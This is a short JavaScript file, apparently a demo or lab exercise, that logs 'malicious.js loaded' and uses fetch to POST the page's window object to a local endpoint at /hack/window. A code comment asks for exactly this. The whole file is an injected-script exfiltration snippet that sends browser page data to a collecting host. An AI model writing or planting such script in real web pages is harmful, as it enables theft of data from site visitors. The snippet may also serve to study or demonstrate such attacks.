// write a logic to get the window object and send it to http://localhost:3002/hack/window as a POST message

console.log('malicious.js loaded');

fetch('http://localhost:3002/hack/window', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({window}),
})
  .then(res => res.json())
  .then(data => {
    console.log(data);
  });
